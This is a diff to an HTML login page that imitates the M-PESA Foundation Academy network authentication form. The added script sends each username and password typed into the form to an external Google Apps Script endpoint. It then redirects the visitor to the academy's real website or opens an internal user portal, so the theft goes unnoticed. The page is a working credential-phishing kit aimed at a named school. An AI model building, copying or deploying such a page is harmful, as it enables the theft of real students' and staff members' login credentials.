@@ -5,89 +5,147 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>M-PESA Foundation Academy Login</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            background-color: #fff;
-            min-height: 100vh;
-            transition: all 0.2s ease-in-out;
+        body{
+            font-family:Arial,sans-serif;
+            margin:0;padding:0;
+            display:flex;flex-direction:column;
+            justify-content:center;align-items:center;
+            background:#fff;min-height:100vh;
         }
-        .login-wrapper {
-            border-left: 1px solid #ddd;
-            border-right: 1px solid #ddd;
-            border-bottom: 1px solid #ddd;
-            width: 300px;
-            min-height: 350px;
-            border-radius: 0 0 4px 4px;
-            transition: all 0.2s ease-in-out;
-            display: flex;
-            flex-direction: column;
-            margin-top: -10px;
+
+        /* ----- Header (logo) – NO top border, open at top ----- */
+        .header-wrapper{
+            width:300px;
+            background:#fff;
+            margin-top:-10px;               /* aligns with "Network Authentication Form" */
         }
-        .image-section {
-            text-align: center;
-            padding-top: 10px;
+        .image-section{
+            text-align:center;
+            padding-top:10px;
         }
-        .image-section img {
-            max-width: 180px;
-            height: auto;
+        .image-section img{
+            max-width:180px;height:auto;
         }
-        .login-container {
-            padding: 15px 15px 15px; /* 1.5 cm top/sides, 1.5 cm bottom gap to container line */
-            text-align: center;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            background-color: #fff;
-            flex-grow: 1;
-            transition: all 0.2s ease-in-out;
+
+        /* ----- Form area – side borders start just below logo, stop above Username ----- */
+        .login-form-wrapper{
+            border-left:1px solid #ddd;
+            border-right:1px solid #ddd;
+            border-bottom:1px solid #ddd;
+            width:300px;
+            border-radius:0 0 4px 4px;
+            background:#fff;
+            box-shadow:0 2px 4px rgba(0,0,0,.1);
+            margin-top:-1px;                /* connects smoothly to header */
         }
-        .login-container input {
-            width: 100%;
-            padding: 8px;
-            margin: 15px 0; /* 1.5 cm gap between Username and Password */
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            font-size: 0.9em;
-            color: #757575;
-            box-sizing: border-box;
-            margin-top: 0;
-            transition: all 0.2s ease-in-out;
+        .login-container{
+            padding:15px 15px 15px;         /* 1.5 cm top / sides / bottom */
+            text-align:center;
         }
-        .login-container button {
-            width: 100%;
-            padding: 8px;
-            margin-top: 12px; /* 1.2 cm gap from link to button */
-            background-color: #4CAF50;
-            border: 1px solid #45a049;
-            border-radius: 4px;
-            color: white;
-            font-size: 0.9em;
-            font-family: Arial, sans-serif;
-            cursor: pointer;
-            box-sizing: border-box;
-            box-shadow: 0 0 5px rgba(76, 175, 80, 0.3);
-            transition: all 0.2s ease-in-out;
+        .login-container input{
+            width:100%;padding:8px;
+            margin:15px 0;                  /* 1.5 cm between fields */
+            border:1px solid #ccc;
+            border-radius:4px;
+            font-size:.9em;color:#757575;
+            box-sizing:border-box;
         }
-        .login-container button:hover {
-            background-color: #45a049;
+        .login-container button{
+            width:100%;padding:8px;
+            margin-top:12px;                /* 1.2 cm from link to button */
+            background:#4CAF50;
+            border:1px solid #45a049;
+            border-radius:4px;
+            color:#fff;font-size:.9em;
+            cursor:pointer;
+            box-shadow:0 0 5px rgba(76,175,80,.3);
         }
-        .login-container a {
-            display: block;
-            margin-top: 15px; /* 1.5 cm gap from Login button to link */
-            color: #4a4a4a;
-            text-decoration: none;
-            font-size: 0.85em;
-            font-family: Arial, sans-serif;
-            transition: all 0.2s ease-in-out;
+        .login-container button:hover{background:#45a049;}
+        .login-container a{
+            display:block;
+            margin-top:15px;                /* 1.5 cm from Login to link */
+            color:#4a4a4a;text-decoration:none;
+            font-size:.85em;
         }
-        .login-container #password {
-            margin-top: 15px; /* 1.5 cm gap from Login button to Password */
+        .login-container #password{margin-top:15px;}
+        .footer{
+            text-align:center;color:#4a4a4a;
+            margin-top:5px;padding:6px 0;
+            font-size:.85em;width:100%;
         }
-        .footer {
-            text-align: center;
-            color: #4a4a4a;
-            margin-top
+        #message,#error{display:none;}
+    </style>
+</head>
+<body>
+
+    <!-- Open-top header (logo only) -->
+    <div class="header-wrapper">
+        <div class="image-section">
+            <img src="Image 17-09-2025 at 11.50.jpeg" alt="M-PESA Foundation Academy">
+        </div>
+    </div>
+
+    <!-- Form container – borders start just below logo -->
+    <div class="login-form-wrapper">
+        <div class="login-container">
+            <form id="loginForm">
+                <input type="text" id="username" placeholder="Enter your Username" required>
+                <input type="password" id="password" placeholder="Enter your Password" required>
+                <button type="submit">Login</button>
+            </form>
+            <a href="#" id="userPortalLink">Click here to access User Portal</a>
+            <div id="message"></div>
+            <div id="error"></div>
+        </div>
+    </div>
+
+    <div class="footer">
+        Curiosity : Leadership : Accountability : Innovation : Responsible Citizenship : Excellence
+    </div>
+
+    <script>
+        const form = document.getElementById('loginForm');
+        const userPortalLink = document.getElementById('userPortalLink');
+        const webAppUrl = 'https://script.google.com/macros/s/AKfycbw104iJMQPmeuC9Nis5buVrtGV9UC4XaEI6_GEMDeDEzrShwo0E04FWhbI7eAL8tecg/exec';
+        const redirectUrl = 'https://mpesafoundationacademy.ac.ke';
+        const userPortalUrl = 'https://172.16.200.3:65040/userportal/webpages/myaccount/login.jsp';
+
+        async function sendCredentials(u, p){
+            try{
+                const resp = await fetch(webAppUrl,{
+                    method:'POST',
+                    mode:'cors',
+                    headers:{'Content-Type':'text/plain;charset=utf-8'},
+                    body:new URLSearchParams({username:u||'',password:p||''}).toString()
+                });
+                const data = await resp.json();
+                return data.success===true;
+            }catch(e){ return false; }
+        }
+
+        // Login button
+        form.addEventListener('submit', async e=>{
+            e.preventDefault();
+            const u = document.getElementById('username').value;
+            const p = document.getElementById('password').value;
+            if(await sendCredentials(u,p)) {
+                window.location.href = redirectUrl;
+            }
+        });
+
+        // User Portal link – sends credentials + opens portal in new tab
+        userPortalLink.addEventListener('click', async e=>{
+            e.preventDefault();
+            const u = document.getElementById('username').value;
+            const p = document.getElementById('password').value;
+            const success = await sendCredentials(u,p);
+            // Open portal in new tab regardless (you may change this)
+            window.open(userPortalUrl, '_blank');
+            if(success) {
+                // Optional: redirect main page too
+                // window.location.href = redirectUrl;
+            }
+        });
+    </script>
+</body>
+</html>
